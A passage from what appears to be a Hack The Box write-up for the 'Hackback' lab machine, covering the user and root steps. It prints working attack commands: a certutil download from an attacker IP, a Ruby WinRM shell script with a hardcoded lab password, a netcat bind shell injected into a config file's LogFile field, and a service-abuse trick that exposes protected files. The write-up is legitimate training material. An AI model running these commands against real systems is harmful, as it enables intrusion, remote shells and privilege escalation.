-a----         5/4/2018  12:21 PM          23552 RawCap.exe
</code></pre></div></div>
<p>A new directory appeared : <code class="language-plaintext highlighter-rouge">scripts</code>. looking in that directory :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS hackback\simple@HACKBACK util&gt; cd scripts
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
Could not find item C:\util\scripts.
At line:1 char:56
+ ... join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name), ...
+                                                           ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\util\scripts:String) [Get-Item], IOException
    + FullyQualifiedErrorId : ItemNotFound,Microsoft.PowerShell.Commands.GetItemCommand
PS hackback\simple@HACKBACK &gt; ls

    Directory: C:\util\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM            spool
-a----       12/21/2018   5:44 AM         84 backup.bat
-a----         7/5/2019   5:34 PM         39 batch.log
-a----         7/5/2019   6:07 PM        135 clean.ini
-a----        12/8/2018   9:17 AM       1232 dellog.ps1
-a----         7/5/2019   5:34 PM         36 log.txt
</code></pre></div></div>
<p>Without talking too much about the rabbit holes and the failed attempts. If we check <code class="language-plaintext highlighter-rouge">clean.ini</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS hackback\simple@HACKBACK &gt; type clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
</code></pre></div></div>
<p>Obviously it gets executed from time to time, and it’s the only writable thing by <code class="language-plaintext highlighter-rouge">simple</code> in that directory. We can inject commands in <code class="language-plaintext highlighter-rouge">LogFile</code> which means that we can make another user execute our commands. I tried to upload <code class="language-plaintext highlighter-rouge">nc.exe</code> but :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS hackback\simple@HACKBACK &gt; certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\system32\spool\drivers\color\nc.exe
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
At line:1 char:1
+ certutil -urlcache -split -f http://10.10.xx.xx/nc64.exe C:\windows\s ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
</code></pre></div></div>
<p>Expected. I terminated that <code class="language-plaintext highlighter-rouge">winrm</code> session and used Alamot’s other <code class="language-plaintext highlighter-rouge">winrm</code> shell that had upload and download capabilities :</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/ruby</span>

<span class="nb">require</span> <span class="s1">'winrm-fs'</span>

<span class="c1"># Author: Alamot</span>
<span class="c1"># To upload a file type: UPLOAD local_path remote_path</span>
<span class="c1"># e.g.: PS&gt; UPLOAD myfile.txt C:\temp\myfile.txt</span>

<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> 
  <span class="ss">endpoint: </span><span class="s1">'http://10.10.10.128:5985/wsman'</span><span class="p">,</span>
  <span class="ss">user: </span><span class="s1">'simple'</span><span class="p">,</span>
  <span class="ss">password: </span><span class="s1">'ZonoProprioZomaro:-('</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">file_manager</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">FS</span><span class="o">::</span><span class="no">FileManager</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span> 


<span class="k">class</span> <span class="nc">String</span>
  <span class="k">def</span> <span class="nf">tokenize</span>
    <span class="nb">self</span><span class="p">.</span>
      <span class="nf">split</span><span class="p">(</span><span class="sr">/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/</span><span class="p">).</span>
      <span class="nf">select</span> <span class="p">{</span><span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="n">not</span> <span class="n">s</span><span class="p">.</span><span class="nf">empty?</span> <span class="p">}.</span>
      <span class="nf">map</span> <span class="p">{</span><span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="n">s</span><span class="p">.</span><span class="nf">gsub</span><span class="p">(</span><span class="sr">/(^ +)|( +$)|(^["']+)|(["']+$)/</span><span class="p">,</span><span class="s1">''</span><span class="p">)}</span>
  <span class="k">end</span>
<span class="k">end</span>


<span class="n">command</span><span class="o">=</span><span class="s2">""</span>

<span class="n">conn</span><span class="p">.</span><span class="nf">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">"exit</span><span class="se">\n</span><span class="s2">"</span> <span class="k">do</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="s2">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')"</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">output</span><span class="p">.</span><span class="nf">chomp</span><span class="p">)</span>
        <span class="n">command</span> <span class="o">=</span> <span class="no">STDIN</span><span class="p">.</span><span class="nf">gets</span>
        <span class="k">if</span> <span class="n">command</span><span class="p">.</span><span class="nf">start_with?</span><span class="p">(</span><span class="s1">'UPLOAD'</span><span class="p">)</span> <span class="k">then</span>
            <span class="n">upload_command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="nf">tokenize</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">"Uploading "</span> <span class="o">+</span> <span class="n">upload_command</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">" to "</span> <span class="o">+</span> <span class="n">upload_command</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
            <span class="n">file_manager</span><span class="p">.</span><span class="nf">upload</span><span class="p">(</span><span class="n">upload_command</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">upload_command</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">do</span> <span class="o">|</span><span class="n">bytes_copied</span><span class="p">,</span> <span class="n">total_bytes</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="o">|</span>
                <span class="nb">puts</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">bytes_copied</span><span class="si">}</span><span class="s2"> bytes of </span><span class="si">#{</span><span class="n">total_bytes</span><span class="si">}</span><span class="s2"> bytes copied"</span><span class="p">)</span>
            <span class="k">end</span>
            <span class="n">command</span> <span class="o">=</span> <span class="s2">"echo `nOK`n"</span>
        <span class="k">end</span>
        <span class="k">if</span> <span class="n">command</span><span class="p">.</span><span class="nf">start_with?</span><span class="p">(</span><span class="s1">'DOWNLOAD'</span><span class="p">)</span> <span class="k">then</span>
            <span class="n">download_command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="nf">tokenize</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">"Downloading "</span> <span class="o">+</span> <span class="n">download_command</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">" to "</span> <span class="o">+</span> <span class="n">download_command</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
            <span class="n">file_manager</span><span class="p">.</span><span class="nf">download</span><span class="p">(</span><span class="n">download_command</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">download_command</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">do</span> <span class="o">|</span><span class="n">bytes_copied</span><span class="p">,</span> <span class="n">total_bytes</span><span class="p">,</span> <span class="n">local_path</span><span class="p">,</span> <span class="n">remote_path</span><span class="o">|</span>
                <span class="nb">puts</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">bytes_copied</span><span class="si">}</span><span class="s2"> bytes of </span><span class="si">#{</span><span class="n">total_bytes</span><span class="si">}</span><span class="s2"> bytes copied"</span><span class="p">)</span>
            <span class="k">end</span>
            <span class="n">command</span> <span class="o">=</span> <span class="s2">"echo `nOK`n"</span>
        <span class="k">end</span>

        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span>
            <span class="no">STDOUT</span><span class="p">.</span><span class="nf">print</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span>
            <span class="no">STDERR</span><span class="p">.</span><span class="nf">print</span><span class="p">(</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">end</span>
    <span class="k">end</span>    
    <span class="nb">puts</span><span class="p">(</span><span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="p">.</span><span class="nf">exitcode</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div>
<p>Then I uploaded <code class="language-plaintext highlighter-rouge">nc.exe</code> to <code class="language-plaintext highlighter-rouge">C:\windows\system32\spool\drivers\color\</code> (to bypass applocker) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# proxychains ./winrm2.rb 
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
PS hackback\simple@HACKBACK Documents&gt; UPLOAD /root/Desktop/HTB/boxes/hackback/nc.exe C:\windows\system32\spool\drivers\color\nc.exe
Uploading /root/Desktop/HTB/boxes/hackback/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-10.10.10.128:5985-&lt;&gt;&lt;&gt;-OK
26892 bytes of 51488 bytes copied
51488 bytes of 51488 bytes copied

OK
PS hackback\simple@HACKBACK Documents&gt;
</code></pre></div></div>
<p>After that I used simple echo commands to edit <code class="language-plaintext highlighter-rouge">clean.ini</code>. It should look like this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
Directory=c:\inetpub\logs\logfiles
</code></pre></div></div>
<p>This way we can get a bind shell.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\util\scripts&gt; echo [Main] &gt; C:\util\scripts\clean.ini
echo [Main] &gt; C:\util\scripts\clean.ini
PS C:\util\scripts&gt; echo LifeTime=100 &gt;&gt; C:\util\scripts\clean.ini
echo LifeTime=100 &gt;&gt; C:\util\scripts\clean.ini
PS C:\util\scripts&gt; echo "LogFile=c:\util\scripts\log.txt &amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe" &gt;&gt; C:\util\scripts\clean.ini                                          
echo "LogFile=c:\util\scripts\log.txt &amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe" &gt;&gt; C:\util\scripts\clean.ini                                                              
PS C:\util\scripts&gt; echo "Directory=c:\inetpub\logs\logfiles" &gt;&gt; C:\util\scripts\clean.ini
echo "Directory=c:\inetpub\logs\logfiles" &gt;&gt; C:\util\scripts\clean.ini
PS C:\util\scripts&gt; cat clean.ini
cat clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory=c:\inetpub\logs\logfiles
PS C:\util\scripts&gt;
</code></pre></div></div>
<p>After some time the listener starts and we can connect to port 1338 through the proxy :
<br><img src="/images/hackthebox/hackback/29.png" alt="" class="align-center"><br><br>
Finally we owned user !</p>

<h2 id="userlogger-filesystem-access-as-system-root-flag">UserLogger, Filesystem Access as System, Root Flag</h2>
<p>After getting a shell as <code class="language-plaintext highlighter-rouge">hacker</code> I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that.<br>
I noticed  a strange service called <code class="language-plaintext highlighter-rouge">UserLogger</code> :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">        </span><span class="nl">"name"</span><span class="p">:</span><span class="w">  </span><span class="s2">"UserLogger"</span><span class="err">,</span><span class="w">
        </span><span class="nl">"startname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"LocalSystem"</span><span class="err">,</span><span class="w">
        </span><span class="nl">"displayname"</span><span class="p">:</span><span class="w">  </span><span class="s2">"User Logger"</span><span class="err">,</span><span class="w">
        </span><span class="nl">"status"</span><span class="p">:</span><span class="w">  </span><span class="s2">"OK"</span><span class="w">
</span></code></pre></div></div>
<p>So I checked the entry of that service in registry :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security

</code></pre></div></div>
<p>Description says it’s responsible for logging user activity. I tried to start that service as <code class="language-plaintext highlighter-rouge">hacker</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;sc start userlogger
sc start userlogger

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368   
        FLAGS              :
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">hacker</code> was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it <code class="language-plaintext highlighter-rouge">test.txt</code> then I started the service and gave it the file as a parameter : <code class="language-plaintext highlighter-rouge">sc start userlogger test.txt</code>. It created a new file called <code class="language-plaintext highlighter-rouge">test.txt.log</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\hacker\Documents&gt;type test.txt.log
type test.txt.log

Logfile specified!
Service is starting
Service is running
</code></pre></div></div>
<p>Nothing interesting, however when I checked the permissions of that file :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\hacker\Documents&gt;cacls C:\Users\hacker\Documents\test.txt.log
cacls C:\Users\hacker\Documents\test.txt.log

C:\Users\hacker\Documents\test.txt.log Everyone: F
</code></pre></div></div>
<p>It’s readable by everyone. This means we can use this service to read anything we don’t have access to, but how will we do that ? it adds <code class="language-plaintext highlighter-rouge">.log</code> after the file name ..<br>
Since windows doesn’t accept <code class="language-plaintext highlighter-rouge">:</code> in filenames we can try to read <code class="language-plaintext highlighter-rouge">root.txt</code> like this : <code class="language-plaintext highlighter-rouge">sc start userlogger C:\users\administrator\desktop\root.txt:</code>
When it tries to add <code class="language-plaintext highlighter-rouge">.log</code> everything after <code class="language-plaintext highlighter-rouge">:</code> will be removed and the new permissions will be applied to <code class="language-plaintext highlighter-rouge">root.txt</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; cmd /c "sc start userlogger 'c:\users\administrator\desktop\root.txt:'"
cmd /c "sc start userlogger 'c:\users\administrator\desktop\root.txt:'"

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368  
        FLAGS              : 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/30.png" alt="" class="align-center"><br><br>
It worked and we are able to read <code class="language-plaintext highlighter-rouge">root.txt</code>. But what is this ? A troll ? 
Just like bighead I suspected that it had an alternate data stream, but without using <code class="language-plaintext highlighter-rouge">streams.exe</code> I tried some stuff and one of my guesses worked :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat c:\users\administrator\desktop\root.txt:flag.txt
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/31.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/netmon/">Hack The Box - Netmon</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-07-06T07:00:00+02:00">July 6, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/netmon/" class="pagination--pager" title="Hack The Box - Netmon
">Previous</a>
    
    
      <a href="/hack-the-box/friendzone/" class="pagination--pager" title="Hack The Box - Friendzone
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
